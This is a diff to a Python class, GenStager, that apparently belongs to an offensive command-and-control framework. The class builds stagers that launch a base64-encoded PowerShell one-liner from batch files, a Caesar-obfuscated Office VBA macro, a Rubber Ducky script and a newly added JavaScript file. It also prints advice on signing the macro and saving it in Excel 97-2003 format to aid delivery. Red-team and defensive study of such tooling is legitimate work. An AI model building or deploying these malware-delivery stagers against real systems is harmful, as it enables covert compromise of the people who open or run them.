@@ -23,19 +23,17 @@ class GenStager:
 		
 		# Turn the powershell code into a suitable powershell base64 encoded one line command
 		base64Payload = helpers.powershellEncode(posh)
-
-		substituteTable = { 'payload': base64Payload }
-		oneliner = helpers.convertFromTemplate({'payload': base64Payload}, cfg.defaultPath['onelinerTpl'])
-		return oneliner
+		oneLiner = helpers.convertFromTemplate({'payload': base64Payload}, cfg.defaultPath['onelinerTpl'])
+		return oneLiner
 
 	#-----------------------------------------------------------
 	def batch(self):
 		"""Creates a Windows batch file (.bat) that launches a powershell one liner command"""
 
 		# First generate the powershell one liner
-		oneliner = self.oneLiner()
+		oneLiner = self.oneLiner()
 
-		batch = helpers.convertFromTemplate({'poshCmd': oneliner}, cfg.defaultPath['batchTpl'])
+		batch = helpers.convertFromTemplate({'oneliner': oneLiner}, cfg.defaultPath['batchTpl'])
 		if batch == None: return
 				
 		try:
@@ -51,12 +49,12 @@ class GenStager:
 		"""Creates an Office VBA macro that launches a powershell one liner command"""
 		
 		# First generate the powershell one liner
-		oneliner = self.oneLiner()
+		oneLiner = self.oneLiner()
 		
 		# Scramble the oneliner with a dumb caesar cipher :-) Simple obfuscation will do
 		key = helpers.randomInt(0,94) # 94 is the range of printable ASCII chars (between 32 and 126)
 		scrambledOneliner = ""
-		for char in oneliner:
+		for char in oneLiner:
 			num = ord(char) - 32 # Translate the working space, 32 being the first printable ASCI char
 			shifted = (num + key)%94 + 32
 			if shifted == 34:
@@ -144,7 +142,7 @@ class GenStager:
 				f.write(macro)
 				f.close()
 				print helpers.color("[+] Macro stager saved in [{}]".format(cfg.defaultPath['macroStager']))
-				print helpers.color("[*] Advise: Use this macro in Excel, sign it even with a self-signed certificate, and save it in format Excel 97-2003")
+				print helpers.color("[*] Advise: Use this VBA macro in Excel, sign it even with a self-signed certificate, and save it in format 'Excel 97-2003'")
 		except IOError:
 			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['macroStager']))
 
@@ -170,10 +168,10 @@ class GenStager:
 		"""Creates an ducky command file that launches a powershell one liner command"""
 		
 		# First generate the powershell one liner
-		oneliner = self.oneLiner()
+		oneLiner = self.oneLiner()
 		
 		# Construct the ducky file from a template, substituting palceholders with proper parameters
-		ducky = helpers.convertFromTemplate({'oneliner': oneliner}, cfg.defaultPath['duckyTpl'])
+		ducky = helpers.convertFromTemplate({'oneliner': oneLiner}, cfg.defaultPath['duckyTpl'])
 		if ducky == None: return
 
 		try:
@@ -184,3 +182,22 @@ class GenStager:
 		except IOError:
 			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['duckyStager']))
 
+
+	#-----------------------------------------------------------
+	def javascript(self):
+		"""Creates a javascript file that launches a powershell one liner command"""
+		
+		# First generate the powershell one liner
+		oneLiner = self.oneLiner()
+		
+		# Construct the javascript file from a template, substituting palceholders with proper parameters
+		javascript = helpers.convertFromTemplate({'oneliner': oneLiner}, cfg.defaultPath['javascriptTpl'])
+		if javascript == None: return
+
+		try:
+			with open(cfg.defaultPath['javascriptStager'],"w+") as f:
+				f.write(javascript)
+				f.close()
+				print helpers.color("[+] Javascript stager saved in [{}]".format(cfg.defaultPath['javascriptStager']))
+		except IOError:
+			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['javascriptStager']))
